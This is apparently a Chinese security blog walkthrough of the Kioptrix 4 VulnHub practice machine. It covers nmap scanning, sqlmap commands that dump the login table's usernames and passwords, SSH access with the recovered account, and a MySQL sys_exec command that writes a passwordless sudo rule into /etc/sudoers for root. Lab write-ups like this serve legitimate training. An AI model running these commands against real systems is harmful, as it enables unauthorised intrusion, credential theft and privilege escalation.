@@ -1,0 +1,249 @@
+> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ybqyixGJmn7Eco01LsbpLA)
+
+![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/1brjUjbpg5woLxm1R7bkgS0xELvt3I75r1nOjBycGwcBqCoO4AtB7FQNfiasb7z3JWibPtaeZussh9jnKKmOECmg/640?wx_fmt=png)
+
+点击上方 “信安前线” 可订阅
+
+**0x01** Introduction
+---------------------
+
+虚拟机下载页面：https://download.vulnhub.com/kioptrix/Kioptrix4_Hyper_v.rar
+
+Description
+
+```
+Again a long delay between VMs, but that cannot be helped. Work, family must come first. Blogs and hobbies are pushed down the list. These things aren’t as easy to make as one may think. Time and some planning must be put into these challenges, to make sure that:
+
+1. It’s possible to get root remotely [ Edit: sorry not what I meant ]
+
+1a. It’s possible to remotely compromise the machine
+
+Stays within the target audience of this site
+
+Must be “realistic” (well kinda…)
+
+Should serve as a refresher for me. Be it PHP or MySQL usage etc. Stuff I haven’t done in a while.
+
+I also had lots of troubles exporting this one. So please take the time to read my comments at the end of this post.
+
+Keeping in the spirit of things, this challenge is a bit different than the others but remains in the realm of the easy. Repeating myself I know, but things must always be made clear: These VMs are for the beginner. It’s a place to start.
+
+I’d would love to code some small custom application for people to exploit. But I’m an administrator not a coder. It would take too much time to learn/code such an application. Not saying I’ll never try doing one, but I wouldn’t hold my breath. If someone wants more difficult challenges, I’m sure the Inter-tubes holds them somewhere. Or you can always enroll in Offsec’s PWB course. *shameless plug
+
+-- A few things I must say. I made this image using a new platform. Hoping everything works but I can’t test for everything. Initially the VM had troubles getting an IP on boot-up. For some reason the NIC wouldn’t go up and the machine was left with the loopback interface. I hope that I fixed the problem. Don’t be surprised if it takes a little moment for this one to boot up. It’s trying to get an IP. Be a bit patient. Someone that tested the image for me also reported the VM hung once powered on. Upon restart all was fine. Just one person reported this, so hoping it’s not a major issue. If you plan on running this on vmFusion, you may need to convert the imagine to suit your fusion version.
+
+-- Also adding the VHD file for download, for those using Hyper-V. You guys may need to change the network adapter to “Legacy Network Adapter”. I’ve test the file and this one seems to run fine for me… If you’re having problems, or it’s not working for any reason email comms[=]kioptrix.com
+
+Thanks to @shai_saint from www.n00bpentesting.com for the much needed testing with various VM solutions.
+
+Thanks to Patrick from Hackfest.ca for also running the VM and reporting a few issues. And Swappage & @Tallenz for doing the same. All help is appreciated guys
+
+So I hope you enjoy this one.
+
+The Kioptrix Team
+```
+
+**0x02 Writeup**
+----------------
+
+#### 1 信息收集
+
+##### 1.1 端口信息扫描
+
+nmap 扫描开放端口
+
+```
+root@kali:~# nmap -sS -sV -p 1-65535 -T4 10.0.0.143
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-29 10:25 EDT
+Nmap scan report for 10.0.0.143
+Host is up (0.0026s latency).
+Not shown: 39528 closed ports, 26003 filtered ports
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS8zribyB9tY2oLWKj61IibRahYLOklicD5AkiaKfec38vRgoZ8t1QocZt52tMXDuEe8cGkytyFZrmkTw/640?wx_fmt=png)
+
+##### 1.2 主机漏洞信息扫描  
+
+nmap 漏洞脚本库：
+
+```
+root@kali:~# nmap --script=vuln -p 22,80,139,445 10.0.0.143
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-29 10:28 EDT
+Nmap scan report for 10.0.0.143
+Host is up (0.00029s latency).
+
+PORT    STATE SERVICE
+22/tcp  open  ssh
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+80/tcp  open  http
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+| http-csrf:
+| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.0.0.143
+|   Found the following possible CSRF vulnerabilities:
+|
+|     Path: http://10.0.0.143:80/
+|     Form id: myusername
+|     Form action: checklogin.php
+|
+|     Path: http://10.0.0.143:80/checklogin.php
+|     Form id:
+|     Form action: index.php
+|
+|     Path: http://10.0.0.143:80/index.php
+|     Form id: myusername
+|_    Form action: checklogin.php
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-enum:
+|   /database.sql: Possible database backup
+|   /icons/: Potentially interesting folder w/ directory listing
+|   /images/: Potentially interesting directory w/ listing on 'apache/2.2.8 (ubuntu) php/5.2.4-2ubuntu5.6 with suhosin-patch'
+|_  /index/: Potentially interesting folder
+| http-slowloris-check:
+|   VULNERABLE:
+|   Slowloris DOS attack
+|     State: LIKELY VULNERABLE
+|     IDs:  CVE:CVE-2007-6750
+|       Slowloris tries to keep many connections to the target web server open and hold
+|       them open as long as possible.  It accomplishes this by opening connections to
+|       the target web server and sending a partial request. By doing so, it starves
+|       the http server's resources causing Denial Of Service.
+|
+|     Disclosure date: 2009-09-17
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
+|_      http://ha.ckers.org/slowloris/
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+|_http-trace: TRACE is enabled
+|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
+139/tcp open  netbios-ssn
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+445/tcp open  microsoft-ds
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+```
+
+##### 1.3 web 应用方面
+
+应用版本信息：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS8zribyB9tY2oLWKj61IibRamryGRyIWMSK7lyo5R7296McKAXXrKiciciatmvs1zznWQfibykPRLtWKug/640?wx_fmt=png)
+
+目录扫描：  
+
+```
+http://10.0.0.143/
+http://10.0.0.143/checklogin.php
+http://10.0.0.143/database.sql
+http://10.0.0.143/icons/
+http://10.0.0.143/icons/README
+http://10.0.0.143/icons/README.html
+http://10.0.0.143/icons/small/
+http://10.0.0.143/images/
+http://10.0.0.143/index
+http://10.0.0.143/index.php
+http://10.0.0.143/member.php
+```
+
+Web 漏洞扫描：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS8zribyB9tY2oLWKj61IibRasSYribc3AqfEgDk7xHHNsfOibUbnA3NJIR3xQ7ev6f1CUcyTes63IoRA/640?wx_fmt=png)
+
+#### 网站存在数据库文件和 sql 注入
+
+#### 2 Flag 获取  
+
+##### 2.1 getshell
+
+访问 80 网站首页为一个系统登录页面，测试 sql 注入漏洞。
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS8zribyB9tY2oLWKj61IibRaEyicDqS8ziabyLliafviaXGlyTyfUTCvJTOSLcqyS5nDBcAs6515AXsiaZg/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS8zribyB9tY2oLWKj61IibRaNC4lBibaOPJA0ua9N2et7bP2zUIkFGb8TlWJKZibCIVHlCiaXTH0Vu5LA/640?wx_fmt=png)
+
+站点物理路径 / var/www/，网站存在 members 表，表中有 id、username、password 字段。
+
+###### 2.1.1 sql 注入
+
+使用 burp 抓取 post 包，再使用 sqlmap 注入
+
+```
+root@kali:~# sqlmap -r post.txt --dbms=mysql --level 5 --risk 3 --bath --is-dba --dbs --users --passwords
+root@kali:~# sqlmap -r post.txt --dbms=mysql --level 5 --risk 3 --tables -D "members"
+root@kali:~# sqlmap -r post.txt --dbms=mysql --level 5 --risk 3 --columns -T "members" -D "members"
+root@kali:~# sqlmap -r post.txt --dbms=mysql --level 5 --risk 3 --dump -C "id,username,password"--columns -T "members" -D "members"
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS8zribyB9tY2oLWKj61IibRaTJgXadB75eGn5AnsvorALGj59tUicfAgw719qe1TApv7qaEiahuCfM3Q/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS8zribyB9tY2oLWKj61IibRaQkclmCymxEFZYlNBsJWH6ISOFRMTPcw1LM9LKCGuqTaX5iaL0r7ew5w/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS8zribyB9tY2oLWKj61IibRaj2uIFXCxPeOEDmtlTl6GDH9u7DWA5SIyHyKSVNS276LRetwkyts4XQ/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS8zribyB9tY2oLWKj61IibRah3ANmib2TzRcTAxjl5W1b6QSundk0cGiaBp5ZSOWxzickWa26ibIjUHCaQ/640?wx_fmt=png)
+
+##### 后台无法 getshell，尝试使用获取到的账户口令登陆服务器
+
+##### 2.2 权限提升  
+
+收集信息
+
+```
+john@Kioptrix4:~$ uname -a
+john@Kioptrix4:~$ uname -r
+john@Kioptrix4:~$ cat /proc/version
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS8zribyB9tY2oLWKj61IibRaUkCMLCClITkNCibInA7TagDvUwcNa4LIk09GCfc3NtmPVNQVOS8f0wQ/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS8zribyB9tY2oLWKj61IibRam2NbfD0jdQmrCS08YHd5LyVQYakxRQrFUI0wicjjwNbibHLDh1XS52mA/640?wx_fmt=png)
+
+在 exploit-db 上查看相应本地提权 exp  
+
+https://www.exploit-db.com/exploits/5092
+
+https://www.exploit-db.com/exploits/5093
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS8zribyB9tY2oLWKj61IibRaJYCfcbP7DYMbwZG1jibEeh0EefCvCOtgJzgLf2ib1laicq6mWKMQVLm2A/640?wx_fmt=png)
+
+无 gcc 命令，换思路。查看站点网页，查看到网站配置文件
+
+```
+$host="localhost"; // Host name
+$user; // Mysql username
+$password=""; // Mysql password
+$db_; // Database name
+$tbl_; // Table name
+```
+
+尝试 sudos 提权  
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS8zribyB9tY2oLWKj61IibRaEIlqPzGX1n0nVQHfS2KmjbrcA3dHOC75jcXRH51GAHW4OEwAh7OYibA/640?wx_fmt=png)
+
+```
+select sys_exec('echo "john ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers');
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS8zribyB9tY2oLWKj61IibRaT33YhAE0xo9vdJAMb62PXjEHoG2qUYEibicR3D8g4f3TMdF0b9OL1Rjw/640?wx_fmt=png)
+
+flag
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS8zribyB9tY2oLWKj61IibRavWxhB31VzhoCfJibgZS3uBojibYGnhh0k9fbhAbHcRrgCyeTyUSictRsg/640?wx_fmt=png)
+
+**PS：最近有点忙，更新较慢**
+
+更多精彩
+
+*   [Web 渗透技术初级课程介绍](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486030&idx=2&sn=185f303a2f1b5267c0865f117931959d&chksm=fcfc3718cb8bbe0e6f3ca97859e78342852537da2bef3cd76a83cb90ee64a8ca8953b35aa67e&scene=21#wechat_redirect)
+    
+*   [Awvs 14.1.210324124 原版包下载](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247487002&idx=1&sn=56c7210e154aa78ac78ee469749db929&chksm=fcfc334ccb8bba5a212fdacc5a6d25527b68a9da30d83e4477316950f468f03f11820bc11d3c&scene=21#wechat_redirect)  
+    
+*   [商务合作](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486808&idx=1&sn=f50f15f9a3ab7312a08b1f932292faca&chksm=fcfc300ecb8bb918213c6070d864ffcd70ad27ab6525521c31e9ccaa57bdfa2968360ed7e8fe&scene=21#wechat_redirect)
+    
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQSd9wDlUiar0tUpHCYAzrZfTzOvS2SEw9cia9j7d1HKP2bWArPLCegs1XoejVUPu0GkSuZh7Wia7aExA/640?wx_fmt=png)
+
+**如果感觉文****章不错，分享让更多的人知道吧！**
